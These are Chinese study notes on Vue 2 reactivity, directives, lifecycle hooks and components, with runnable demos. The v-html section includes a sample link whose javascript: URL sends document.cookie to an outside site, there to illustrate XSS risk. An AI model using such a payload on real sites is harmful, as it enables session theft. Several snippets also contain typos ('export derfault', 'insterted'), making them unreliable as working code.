                        return p.name.indexOf(this.keyWord) !== -1
                    })
                }
            }
        }
        ) 
    </script>
~~~

![image-20230714213317339](../AppData/Roaming/Typora/typora-user-images/image-20230714213317339.png)

数据监视

更新时的一个问题

this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} 更改data数据，Vue不监听，模板不改变

~~~html
<title>更新时的一个问题</title>
<script type="text/javascript" src="../js/vue.js"></script>

<div id="root">
  <h2>人员列表</h2>
  <button @click="updateMei">更新马冬梅的信息</button>
  <ul>
    <li v-for="(p,index) of persons" :key="p.id">
      {{p.name}}-{{p.age}}-{{p.sex}}
    </li>
  </ul>
</div>

<script type="text/javascript">
  Vue.config.productionTip = false

  const vm = new Vue({
    el: '#root',
    data: {
      persons: [
        { id: '001', name: '马冬梅', age: 30, sex: '女' },
        { id: '002', name: '周冬雨', age: 31, sex: '女' },
        { id: '003', name: '周杰伦', age: 18, sex: '男' },
        { id: '004', name: '温兆伦', age: 19, sex: '男' }
      ]
    },
    methods: {
      updateMei() {
        // this.persons[0].name = '马老师'	//奏效
        // this.persons[0].age = 50				//奏效
        // this.persons[0].sex = '男'			//奏效
        // this.persons[0] = {id:'001',name:'马老师',age:50,sex:'男'} //不奏效
        this.persons.splice(0, 1, { id: '001', name: '马老师', age: 50, sex: '男' })
      }
    }
  })
</script>
~~~

模拟一个数据检测

~~~js
let data = {
  name: '尚硅谷',
  address: '北京',
}

function Observer(obj) {
  // 汇总对象中所有的属性形成一个数组
  const keys = Object.keys(obj)
  // 遍历
  keys.forEach((k) => {
    Object.defineProperty(this, k, {
      get() {
        return obj[k]
      },
      set(val) {
        console.log(`${k}被改了，我要去解析模板，生成虚拟DOM.....我要开始忙了`)
        obj[k] = val
      }
    })
  })
}

// 创建一个监视的实例对象，用于监视data中属性的变化
const obs = new Observer(data)
console.log(obs)

// 准备一个vm实例对象
let vm = {}
vm._data = data = obs
~~~

原理

 1.  vue会监视data中所有层次的数据

 2.  如和检测对象中的数据？

     通过setter实现监视，且要在new Vue()时就传入要检测的数据

     - 对象创建后追加的属性，vue默认不做响应式处理

     - 如需给后添加的属性做响应式，请使用如下api

       Vue.set(target,propertyName/index,value)

       vm.$set(target,propertyName/index,value)

 3.  如何检测数组中的数据

     通过包裹数组更新元素的方法实现，本质就是做了两件事情

     - 调用原生对应的方法对数组进行更新
     - 重新解析模板，进而更新页面

 4.  在vue修改数组中的某个元素一定要用如下方法

     ==push()====pop()====unshift()====shift()====splice()====sort()====reverse()==这几个方法被Vue重写了
     Vue.set()或vm.$set()

特别注意：Vue.set() 和 vm.$set() 不能给vm或vm的根数据对象（data等）添加属性

​    

~~~html
<body>
    <div id="root">
        <h1>学生信息</h1>
        <button @click="student.age++">年龄+1岁</button> <br />
        <button @click="addSex">添加性别属性，默认值：男</button> <br />
        <button @click="student.sex = '未知' ">修改性别</button> <br />
        <button @click="addFriend">在列表首位添加一个朋友</button> <br />
        <button @click="updateFirstFriendName">修改第一个朋友的名字为：张三</button> <br />
        <button @click="addHobby">添加一个爱好</button> <br />
        <button @click="updateHobby">修改第一个爱好为：开车</button> <br />
        <button @click="removeSmoke">过滤掉爱好中的抽烟</button> <br />
        <h3>姓名：{{ student.name }}</h3>
        <h3>年龄：{{ student.age }}</h3>
        <h3 v-if="student.sex">性别：{{student.sex}}</h3>
        <h3>爱好：</h3>
        <ul>
            <li v-for="(h,index) in student.hobby" :key="index">{{ h }} </li>
        </ul>
        <h3>朋友们：</h3>
        <ul>
            <li v-for="(f,index) in student.friends" :key="index">{{ f.name }}--{{ f.age }}</li>
        </ul>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                student: {
                    name: 'tom',
                    age: 18,
                    hobby: ['抽烟', '喝酒', '烫头'],
                    friends: [
                        { name: 'jerry', age: 35 },
                        { name: 'tony', age: 36 }
                    ]
                }
            },
            methods: {
                addSex() {
                    this.$set(this.student, 'sex', '男')
                },
                addFriend() {
                    this.student.friends.unshift({ name: 'jack', age: 70 })
                },
                updateFirstFriendName() {
                    this.student.friends[0].name = '张三'
                },
                addHobby() {
                    this.student.hobby.push('学习')
                },
                updateHobby() {
                    this.$set(this.student.hobby, 0, '开车')
                },
                removeSmoke() {
                    this.student.hobby = this.student.hobby.filter((h) => {
                        return h !== '抽烟'
                    })
                }
            }
        }
        ) 
    </script>
~~~

# 收集表单数据 过滤器

## 收集表单数据

- 若<input type="text"/>  则==v-model==收集的是==value==值，用户输入的内容就是value值
- 若<input type="radio"/> 则==v-model==收集的是==value==值，且要给标签配置value属性
- 若<input type="checkbox"/> 
  - 没配置==value==属性，那么收集的是==checked==属性（勾选or未勾选，是布尔值）
  - 配置了==value==属性
    - ==v-model==的初始值是非数组，那么收集的就是==checked==属性
    - ==v-model==初始值是数组，那么收集的就是==value==组成的数组

a .lazy 失去焦点

b. number 输入字符串转为有效的数字

c. trim 输入的字符串去掉首尾空格过滤

~~~html
<title>收集表单数据</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
</head>

<body>
    <div id="root">
        <form @submit.prevent="demo">
            账号：<input type="text" v-model.trim="userInfo.account"> <br><br>
            密码：<input type="password" v-model="userInfo.password"> <br><br>
            年龄：<input type="number" v-model.number="userInfo.age"> <br><br>
            性别：
            男<input type="radio" v-model="userInfo.sex" value="male">
            女<input type="radio" v-model="userInfo.sex" value="female"> <br><br>
            爱好：
            学习<input type="checkbox" v-model="userInfo.hobby" value="study">
            打游戏<input type="checkbox" v-model="userInfo.hobby" value="game">
            吃饭<input type="checkbox" v-model="userInfo.hobby" value="eat">
            <br><br>
            所属校区：
            <select v-model="userInfo.city">
                <option value="">请选择校区</option>
                <option value="beijing">北京</option>
                <option value="shanghai">上海</option>
                <option value="shenzhen">深圳</option>
            </select>
            <br><br>
            其他信息：
            <textarea v-model.lazy="userInfo.other"></textarea><br><br>
            <input type="checkbox" v-model="userInfo.agree">阅读并接受
            <a href="https://www.yuque.com/cessstudy">《用户协议》</a>
            <button>提交</button>
        </form>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                userInfo: {
                    account: '',
                    password: '',
                    age: 18,
                    sex: 'female',
                    hobby: [],
                    city: 'beijing',
                    other: '',
                    agree: ''
                }
            },
            methods: {
                demo() {
                    console.log(JSON.stringify(this.userInfo))
                }
            }
        }
        ) 
    </script>
~~~



![image-20230715095923074](../AppData/Roaming/Typora/typora-user-images/image-20230715095923074.png)

## 过滤器(Vue3以及移除)

定义：对咬现实的数据进行特定格式化后再显示(适用于一些简单逻辑的处理)

注册过滤器：

​	Vue.filter(name,callback) 全局过滤器

​	new Vue{{filters：{}}} 局部过滤器

使用过滤器{{xxx|过滤器名}} 或v-bind:属性 = “xxx|属性名”

备注：

1. 过滤器可以接受额外参数，多个过滤器也可以串联
2. 并没有改变原本的数据，而是产生新的对应的数据

处理时间的库moment体积较大 dayjs轻量级

~~~html
<body>
    <div id="root">
        <h2>时间</h2>
        <h3>当前时间戳：{{time}}</h3>
        <h3>转换后时间{{time|timeFormater()}}</h3>
        <h3>转换后时间{{time|timeFormater('YYYY-MM-DD HH:mm:ss')}}</h3>
        <h3>截取年月日：{{time | timeFormater() | mySlice}}</h3>
    </div>
    <script>
        Vue.config.productionTip = false
        Vue.filter('mySlice', function (value) {
            return value.slice(0, 11)
        })
        new Vue({
            el: '#root',
            data: {
                time: new Date()
            },
            filters: {
                timeFormater(value, str = "YYYY年MM月DD日 HH:mm:ss") {
                    return dayjs(value).format(str)
                }
            }
        })
    </script>
~~~



![image-20230715101319847](../AppData/Roaming/Typora/typora-user-images/image-20230715101319847.png)

# 内置指令 自定义指令

## 内置指令

之前学过的指令：

​	v-bind 单向绑定

​	v-model 双向绑定

​	v-for 遍历数组、对象、字符串、指定次数

​	v-on 绑定事件，可简写为@

​	v-show 条件渲染

​	v-if 条件渲染

​	v-else-if 条件渲染

​	v-else 条件渲染

### v-text指令

作用：向其所在的节点中渲染文本内容

​	与插值语法的区别：v-text会替换掉节点中的文本内容，{{xxx}}则不会，更加灵活

~~~html
<body>
    <div id="root">
        <div>你好{{name}}</div>
        <div v-text="name"></div>
        <div v-text="str"></div>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                str: '<h3>你好啊</h3>'
            },
        })
    </script>
~~~

![image-20230715101753712](../AppData/Roaming/Typora/typora-user-images/image-20230715101753712.png)

### v-html指令

作用：向指定节点渲染包含html结构的内容

与插值语法的区别

​	v-html会替换掉节点中所有的内容，{{xxx}}则不会

​	v-html可以识别html结构

严重注意v-html有安全性问题

​	在网站上动态渲染任意html都是非常危险的，容易导致xss攻击

​	一定要在可信的内容上使用v-html，永远不要用在用户提交的内容上！！！

~~~html
<body>
    <div id="root">
        <div>你好，{{ name }}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                str: '<h3>你好啊</h3>',
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>'
            },
        })
    </script>
~~~

![image-20230715102217100](../AppData/Roaming/Typora/typora-user-images/image-20230715102217100.png)

### v-cloak指令

v-cloak指令(没有值)

​	本质是一个特殊属性，vue实例创建完毕并接管容器后，会删除v-cloak属性

​	使用css配合v-cloak可以解决网速慢页面出现{{xxx}}的问题

~~~html
<body>
    <div id="root">
        <h2 v-cloak>{{ name }}</h2>
    </div>
    <script src="http://localhost:8080/resource/5s/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        console.log(1)
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
            },
        })
    </script>
~~~

### v-once指令

v-once所在节点在初次动态渲染后，就视为静态内容了，

以后数据的改变不会引起v-once所在结构的更新，可以用于优化性能

~~~html
<title>v-once指令</title>
</head>

<body>
    <div id="root">
        <h2 v-once>初始化的n值是: {{n}}</h2>
        <h2>当前的n值是: {{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        console.log(1)
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
        })
    </script>
~~~



![image-20230715102919846](../AppData/Roaming/Typora/typora-user-images/image-20230715102919846.png)

### v-pre指令

跳过v-pre所在节点的编译过程

可利用他跳过：没有使用指令语法，没有使用插值语法的节点，会加快编译

~~~html
    <title>v-pre指令</title>
</head>

<body>
    <div id="root">
        <h2 v-pre>Vue其实很简单</h2>
        <h2>当前的n值是:{{n}}</h2>
        <button @click="n++">点我n+1</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
        })
    </script>
~~~



## 自定义指令

==directives==

**定义语法**

1.局部指令

~~~js
new Vue({
  directives:{
    指令名：配置对象
  }
})
new Vue({
  directives:{
    指令名：回调函数
  }
})
~~~

2.全局指令

~~~js
Vue.directive(指令名，配置对象)
或
Vue.directive(指令名，回调函数)
Vue.directive('fbind',{
  // 指令与元素成功绑定时（一上来）
  bind(element,binding){
    element.value = binding.value// element就是DOM元素，binding就是要绑定的
  },
  // 指令所在元素被插入页面时
  inserted(element,binding){
    element.focus()
  }
  // 指令所在模板重新解析时
  update(element,binding){
  element.value=binding.value
}
})
~~~

配置对象中常用的三个回调函数

​	bind(element,binding) 指令与元素成功绑定时调用

​	inserted(element,binding) 指令所在元素被插入页面时调用

​	update(element,binding) 指令所在模块结构要被重新解析时调用

element就是DOM元素，binding就是要绑定的对象，它包含以下属性：name、value、oldvalue、expression、arg、modifiers

备注：

​	a. 指令定义时不加v- ，但使用时要加v-

​	b.指令名如果是多个单词，要使用kebab-case命名方法，不要用camelCase命名

~~~js
new Vue({
  el:"#root",
  data:{
    n:1
  },
  directives:{
    'big-name'(element,binding){
      element.innerText=binding.value*10
    }
  }
})
~~~

回顾一个DOM 操作

~~~js
<style>.demo{background-color: orange;}</style>

<body>
  <button id="btn">点我创建一个输入框</button>
</body>

<script type="text/javascript" >
  const btn = document.getElementById('btn')
  btn.onclick = ()=>{
    const input = document.createElement('input')

    input.className = 'demo'
    input.value = 99
    input.onclick = ()=>{alert(1)}

    document.body.appendChild(input)

    input.focus()
    input.parentElement.style.backgroundColor = 'skyblue'
  }
</script>
~~~

~~~html
    <title>自定义指令</title>
</head>

<body>
    <div id="root">
        <h2>{{ name }}</h2>
        <h2>当前的n值是：<span v-text="n"></span> </h2>
        <!-- <h2>放大10倍后的n值是：<span v-big-number="n"></span> </h2> -->
        <h2>放大10倍后的n值是：<span v-big="n"></span> </h2>
        <button @click="n++">点我n+1</button>
        <hr />
        <input type="text" v-fbind:value="n">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                name: 'lyy',
                n: 1
            },
            directives: {
                big(element, binding) {
                    console.log('big', this)
                    element.innerText = binding.value * 10
                },
                fbind: {
                    bind(element, binding) {
                        element.value = binding.value
                    },
                    insterted(element, binding) {
                        element.focus()
                    },
                    update(element, binding) {
                        element.value = binding.value
                    }
                }
            }
        })
    </script>
~~~

![image-20230715104812637](../AppData/Roaming/Typora/typora-user-images/image-20230715104812637.png)

# 生命周期

## 生命周期

- 又叫生命周期回调函数，生命周期函数、生命周期钩子
- 是什么：Vue在关键时刻帮我们调用的一些特殊名称的函数
- 生命周期的名字不可更改，但函数的具体内容是程序员根据需求编写的
- 生命周期的this指向vm或组件实例对象

~~~html
<title>引出生命周期</title>
</head>

<body>
    <div id="root">
        <h2 v-if="a">你好啊</h2>
        <h2 :style="{opacity}">看笔记学Vue</h2>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                a: false,
                opacity: 1

            },
            // 🔴Vue 完成模板的解析并把初始的真实 DOM 元素放入页面后（挂载完毕）调用 mounted
            mounted() {
                console.log('mounted', this)
                setInterval(() => {
                    this.opacity -= 0.01
                    if (this.opacity <= 0) this.opacity = 1
                }, 16);
            },
        })


         // 通过外部的定时器实现（不推荐）
        // setInterval(() => {
        // 		vm.opacity -= 0.01
        // 		if(vm.opacity <= 0) vm.opacity = 1
        // },16)
    </script>
~~~

## 分析生命周期

![生命周期.png](https://cdn.nlark.com/yuque/0/2022/png/1379492/1643297176928-5d5ac765-237c-462d-9188-84935e6c3c69.png?x-oss-process=image%2Fresize%2Cw_1125%2Climit_0)

~~~html
<title>分析生命周期</title>
</head>

<body>
    <div id="root">
        <h2 v-text="n"></h2>
        <h2>当前的n值是：{{ n }}</h2>
        <button @click="add">点我n+1</button>
        <button @click="bye">点我销毁vm</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                n: 1
            },
            methods: {
                add() {
                    console.log('add')
                    this.n++
                },
                bye() {
                    console.log('bye')
                    this.$destroy()
                }
            },
            watch: {
                n() {
                    console.log('n变了');
                }
            },
            beforeCreate() {
                console.log('beforeCreate')
            },
            created() {
                console.log('created')
            },
            beforeMount() {
                console.log("beforeMount")
            },
            mounted() {
                console.log('mounted');
            },
            beforeUpdate() {
                console.log('beforeUpdate');
            },
            updated() {
                console.log('updated')
            },
            beforeDestroy() {
                console.log('beforeDestroy')
            },
            destroyed() {
                console.log('destroyed')
            }
        })
    </script>
~~~



![image-20230715110506727](../AppData/Roaming/Typora/typora-user-images/image-20230715110506727.png)

## 总结生命周期

常用的生命周期钩子

​	a. mounted 发送ajax请求、启动定时器、绑定自定义事件、订阅消息等初始化操作

​	b.beforeDestory 清除定时器、解绑自定义事件、取消订阅信息等收尾工作

关于销毁Vue实例

​	a.销毁后借助Vue开发者工具看不到任何信息

​	b.销毁后自定义事件会失效，但是原生DOM事件依然有效

​	c.一般不会再beforeDestory操作数据，因为即使操作数据，也不会再触发更新流程了

~~~html
<title>引出生命周期</title>
</head>

<body>
    <div id="root">
        <h2 :style="{opacity}">欢迎学习Vue</h2>
        <button @click="opacity = 1">透明度设置为1</button>
        <button @click="stop">点我停止变换</button>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                opacity: 1
            },
            methods: {
                stop() {
                    this.$destroy()
                }
            },
            mounted() {
                console.log('mounted', this)
                this.timer = setInterval(() => {
                    console.log('setInterval')
                    this.opacity -= 0.01
                    if (this.opacity <= 0) this.opacity = 1
                }, 16)
            },
            beforeDestroy() {
                clearInterval(this.timer)
                console.log('vm即将驾鹤西游了')
            },
        })
    </script>
~~~

# 组件化编程

## 模块与组件、模块化与组件化

![img](https://cdn.nlark.com/yuque/0/2022/png/1379492/1643034111142-590bfdbc-e993-4f4f-9a75-110cba2f890d.png)

![img](https://cdn.nlark.com/yuque/0/2022/png/1379492/1643034111832-4a659e2d-4a13-4944-a153-ab038b65cbf0.png)

模块
	a.理解：向外提供特定功能的 js 程序，一般就是一个 js 文件
	b.为什么：js 文件很多很复杂
	c.作用：复用、简化 js 的编写，提高 js 运行效率
组件
	a.定义：用来实现局部功能的代码和资源的集合（html/css/js/image…）
	b.为什么：一个界面的功能很复杂
	c.作用：复用编码，简化项目编码，提高运行效率
模块化
	当应用中的 js 都以模块来编写的，那这个应用就是一个模块化的应用
组件化
	当应用中的功能都是多组件的方式来编写的，那这个应用就是一个组件化的应用

## 非单文件组件

非单文件组件：一个文件中包含有n个组件

单文件组件：一个文件中只包含1个组件

### 基本使用

三大步骤

1.定义组件

- 使用Vue.extend(options)创建，其中options和new Vue(options)时传入的options 几乎一样，但也有点区别
  - el不写，因为最终所有的组件都要经过一个vm的管理，由vm中的el才绝对服务哪个容器
  - data必须写成函数，避免组件被复用时，数据存在引用关系

2.注册组件

1. 局部注册：new Vue() 时options 传入components 选项
2. 全局注册：Vue.component(‘组件名’, 组件)

3.使用组件

​	编写组件标签 如：<school></school>

~~~html
    <title>基本使用</title>
</head>

<body>
    <div id="root">
        <h2>{{msg}}</h2>
        <hr>
        <!-- 第三步：编写组件标签 -->
        <school></school>
        <hr>
        <student></student>
        <hr>
        <hello></hello>
        <hr>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        // 第一步创建组件
        const school = Vue.extend({
            // el:'#root'    //组件定义时，一定不要写el
            // 因为最终所有的组件都要被一个vm管理，由vm决定服务于哪个容器
            template: `
                <div class="demo">
                    <h3>学校名称：{{schoolName}}</h3>
                    <h3>学校地址：{{address}}</h3>
                    <button @click="showName">点我提示学校名</button>	
                </div>
            `,
            data() {
                return {
                    schoolName: 'sgg',
                    address: '河南'
                }
            },
            methods: {
                showName() {
                    alert(this.schoolName)
                }
            }
        })
        // 第一步创建student组件
        const student = Vue.extend({
            template: `
                <div>
					<h3>学生姓名：{{studentName}}</h3>
					<h3>学生年龄：{{age}}</h3>
  			    </div>
            `,
            data() {
                return {
                    studentName: 'lyy',
                    age: 20
                }
            }
        })
        // 第一步，创建hello组件
        const hello = Vue.extend({
            template: `
				<div>	
					<h3>你好啊！{{name}}</h3>
  			</div>
			`,
            data() {
                return {
                    name: 'cess'
                }
            }
        })
        // 第二步，注册全局组件
        Vue.component('hello', hello)
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                msg: '你好啊！'
            },
            //第二步注册局部组件
            components: {
                school,
                student
            }
        })
    </script>
~~~

![image-20230715113527003](../AppData/Roaming/Typora/typora-user-images/image-20230715113527003.png)

### 组件注意事项

关于组件名

- 一个单词组成
  - 第一种写法首字母小写 school
  - 第二种写法 首字母大写 School
- 多个单词组成
  - 第一种写法kekab-case命名 my-school
  - 第二章写法CamelCase命名 MySchool

- 备注
  - 组件名尽可能回避HTML种已经存在的元素名称,例如h2 H2都i不行
  - 可以使用name配置项指定组件在开发者工具种呈现的名字

关于组件标签

- 第一种写法:<school></school>
- 第二种写法:<school/>
- 备注:不使用脚手架时,<school/>会导致后续组件不能渲染

一个简写方式 

> const school = Vue.extend(options) 可以简写为 const school = options 
> 因为父组件components引入的时候会自动创建

~~~html
<title>几个注意点</title>
</head>

<body>
    <div id="root">
        <h2>{{msg}}</h2>
        <school></school>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>
        const school = Vue.extend({
            name: 'atguigu', // 组件给自己起个名字，用于在浏览器开发工具上显示
            template: `
				<div>
					<h3>学校名称：{{name}}</h3>	
					<h3>学校地址：{{address}}</h3>	
				</div>
			`,
            data() {
                return {
                    name: 'zzgyyyjsxy',
                    address: 'hn'
                }
            }
        })
        Vue.config.productionTip = false
        new Vue({
            el: '#root',
            data: {
                msg: '你好啊！'
            },
            components: {
                school
            }
        })
    </script>
~~~

![image-20230715114402031](../AppData/Roaming/Typora/typora-user-images/image-20230715114402031.png)

### 组件的嵌套

![img](https://cdn.nlark.com/yuque/0/2022/png/1379492/1643034109512-1a1a9c24-a474-4022-83b6-b6a16216151a.png?x-oss-process=image%2Fresize%2Cw_1125%2Climit_0)

~~~html
    <title>组件的嵌套</title>
</head>

<body>
    <div id="root">
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>

        Vue.config.productionTip = false
        //定义student组件
        const student = Vue.extend({
            name: 'student',
            template: `
				<div>
					<h4>学生姓名：{{name}}</h4>	
					<h4>学生年龄：{{age}}</h4>	
  			</div>
			`,
            data() { return { name: '尚硅谷', age: 18 } }
        })

        //定义school组件
        const school = Vue.extend({
            name: 'school',
            template: `
				<div>
					<h3>学校名称：{{name}}</h3>	
					<h3>学校地址：{{address}}</h3>	
					<student></student>
 			  </div>
			`,
            data() { return { name: '尚硅谷', address: '北京' } },
            //注册组件（局部）
            components: { student }
        })

        //定义hello组件
        const hello = Vue.extend({
            template: `<h3>{{msg}}</h3>`,
            data() { return { msg: '欢迎来到尚硅谷学习！' } }
        })

        //定义app组件
        const app = Vue.extend({
            template: `
				<div>	
					<hello></hello>
					<school></school>
  			</div>
			`,
            components: { school, hello }
        })

        new Vue({
            el: '#root',
            template: `
            <app></app>
            `,
            data: {
                msg: '你好啊！'
            },
            components: { app }
        })
    </script>
~~~

![image-20230715115035148](assets/image-20230715115035148.png)



### VueComponent

关于VueComponent

- ==school==组件本质是一个名为VueComponent的构造函数,且不是程序员定义的,而是Vue.extend()生成的

- 我们只需要写<school></school>或<school/> , Vue解析时会帮我们创建school组件的实例对象,即Vue帮我们执行的new VueComponent(options)

- 每次调用Vue.extend()返回的都是一个全新的VueComponent,即不同组件是不同的对象

- 关于this指向

  - 组件配置中的data函数methods中的函数watch中的函数 computed中的函数 

    它们的this均是VueComponent实例对象

  - new Vue(options)配置中:data函数methods中的函数watch中的函数 computed中的函数 

    它们的this均是Vue实例对象

- VueComponent的实例对象,以后简称vc(组件实例对象)   Vue的实例对象,以后简称vm

~~~html
    <title>VueComponent</title>
</head>

<body>
    <div id="root">
        <school></school>
        <hello></hello>
    </div>
    <script src="https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js"></script>
    <script>

        Vue.config.productionTip = false
        const school = Vue.extend({
            name: 'school',
            template: `
				<div>
					<h2>学校名称：{{name}}</h2>	
					<h2>学校地址：{{address}}</h2>	
					<button @click="showName">点我提示学校名</button>
  			</div>
			`,
            data() { return { name: '尚硅谷', address: '北京' } },
            methods: { showName() { console.log('showName', this) } },
        })

        const test = Vue.extend({
            template: `<span>atguigu</span>`
        })

        // 定义hello组件
        const hello = Vue.extend({
            template: `
				<div>
					<h2>{{msg}}</h2>
					<test></test>	
  			</div>
			`,
            data() { return { msg: '你好啊！' } },
            components: { test }
        })

        new Vue({
            el: '#root',
            components: { school, hello }
        })
    </script>
~~~



![image-20230715120026623](assets/image-20230715120026623.png)

### 一个重要的内置关系

![image.png](assets/1643034116880-0c7ffd4b-f0ed-47b2-9638-3bb71344c4f1.png)

1. 一个重要的内置关系:VueComponent.prototype.__ proto __===Vue.prototyoe
2. 为什么要有这个关系,让组件实例对象vc可以访问到Vue原型上的属性和方法

## 单文件组件

- School.vue

~~~vue
<template>
	<div id="demo">
    <h2>学校名称:{{name}}</h2>
    <h2>学校地址:{{address}}</h2>
    <button @click="showName">点我提示学校名字</button>
  </div>
</template>
<script>
	export derfault{
    name:'School',
    data(){
      return {
        name:"sgg",
        address:"hn"
      },
    methods:{
      showName(){
        alert(this.name)
      }
    }
    }
  }
</script>
<style>
  #demo{
    background:orange;
  }
</style>
~~~

- Student.vue

~~~vue
<template>
	<div>
    <h2>学生姓名:{{name}}</h2>
    <h2>学生年龄:{{age}}</h2>
  </div>
</template>

<script>
	export default{
    name:'Student',
    data(){
      return {
        name:'lyy',
        age:20
      }
    }
  }
</script>
~~~

- App.vue

~~~vue
<template>
	<div>
    <School></School>
    <Student></Student>
  </div>
</template>

<script>
  import School from './School.vue'
  import Student from './Student.vue'
  
	export default{
    name:'App',
    components:{
      School,
      Student
    }
  }
</script>
~~~

- main.js

~~~js
import App from './App.vue'

new Vue({
  template:`<App></App>`,
  components:{App}
})
~~~

- index.html

~~~html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>单文件组件练习</title>
</head>
<body>
    <div id="root"></div>
    <script src="../../js/vue.js"></script>
    <script src="./main.js"></script>
</body>
</html>

~~~

# Vue CLI 初始化脚手架

## 初始化脚手架

### 说明

1. Vue脚手架是Vue官方提供的标准化开发工具
2. 最新的版本是?
3. 文档[Vue Cle](#https://cli.vuejs.org/zh/)

### 具体步骤

1. 如果下载缓慢,配置淘宝镜像npm config registry http://registry.npm.taobao.org
2. 全局安装@Vue/cli  npm isntall -g @Vue/cli
3. 切换到创建项目的目录,使用命令创建项目 Vue create xxx
4. 选择使用Vue的版本
5. 启动项目 npm run serve
6. 打包项目 npm run build
7. 暂停项目 ctrl + c

> vue脚手架隐藏了所有webpack相关的配置,若想查看具体的webpack配置,请执行vue inspect >output.js   
>
> 注意:只是查看,修改不起作用,只是输出一下配置看一下

### 脚手架文件结构

~~~markdown
.文件目录
├── node_modules 
├── public
│   ├── favicon.ico: 页签图标
│   └── index.html: 主页面
├── src
│   ├── assets: 存放静态资源
│   │   └── logo.png
│   │── component: 存放组件
│   │   └── HelloWorld.vue
│   │── App.vue: 汇总所有组件
│   └── main.js: 入口文件
├── .gitignore: git版本管制忽略的配置
├── babel.config.js: babel的配置文件
├── package.json: 应用包配置文件 
├── README.md: 应用描述文件
└── package-lock.json: 包版本控制文件
~~~

==src/components/School.vue==

~~~vue
<template>
	<div class="demo">
    <h2>学校名称:{{name}}</h2>
    <h2>学校地址:{{address}}</h2>
    <button @click="showName">点我提示学校名称</button>
  </div>
</template>
<script>
  export default{
    name:"School",
    data(){
      return {
        name:"sgg",
        address:"hn"
      }
    },
    methods:{
      showName(){
        alert(this.name)
      }
    }
  }
</script>
<style>
  .demo{
    background-color: orange;
  }
</style>
~~~

==src/components/Student.vue==

~~~vue
<template>
	<div>
    <h2>学生姓名:{{name}}</h2>
    <h2>学生年龄:{{age}}</h2>
  </div>
</template>
<script>
	export default {
    name:'Student',
    data(){
      return {
        name:"lyy",
        age:20
      }
    }
  }
</script>
~~~

==src/App.vue==

~~~vue
<template>
	<div>
  	<img src="./assets/logo.png" alt="">
   <School></School>
   <Student></Student>
  </div>
</template>
<script>
  import School from './components/School.vue'
  import Student from './components/Student.vue'
	export default {
    name:'App',
    components:{School,Student}
  }
</script>
~~~

==src/main.js==

~~~js
import Vue from 'vue'
import App from './App.vue'
Vue.config.productionTip = false
new Vue({
  el:"app",
  render:h=>h(app)
  // render(h){
  // retuen h(app)
	// }
})// .$mount('#app')
~~~

==public/index.html==

~~~html

<!DOCTYPE html>
<html lang="">
    <head>
        <meta charset="UTF-8">
      
        <!-- 针对IE浏览器的特殊配置，含义是让IE浏览器以最高渲染级别渲染页面 -->
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
      
        <!-- 开启移动端的理想端口 -->
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
      
        <!-- 配置页签图标 <%= BASE_URL %>是public所在路径，使用绝对路径 -->
        <link rel="icon" href="<%= BASE_URL %>favicon.ico">
      
        <!-- 配置网页标题 -->
        <title><%= htmlWebpackPlugin.options.title %></title>
    </head>
    <body>
      
      	<!-- 当浏览器不支持js时，noscript中的元素就会被渲染 -->
      	<noscript>
      		<strong>We're sorry but <%= htmlWebpackPlugin.options.title %> doesn't work properly without JavaScript enabled. Please enable it to continue.</strong>
    		</noscript>
        <!-- 容器 -->
        <div id="app"></div>
    </body>
</html>
~~~

![image-20230715131450455](assets/image-20230715131450455.png)

### render函数

~~~js
import Vue from 'vue'
import App from './App.vue'

Vue.productionTip = false

new Vue({
  el:'#app',
  // render函数功能,将App组件放入容器中
  render:h=>h(app).
  // 完整形式
  //render(createElement){
  //	return createElement(app)
	// }
})
~~~

### 关于不同版本的函数

1. vue.js 与vue.runtime.xxx.js的区别

   1. ==vue.js== 是完整版的Vue ,包含：==核心功能==+==模板解析器==

   2. vue.runtime.xxx.js 是运行版的Vue，只包含核心功能，没有模板解析器

      esm就是ES6 module

2. 因为**vue.runtime.xxx.js**没有模板解析器，所以不能使用==template==配置项，需要使用render函数接收到的==createElement==函数去制定具体内容

### Vue.config.js配置文件

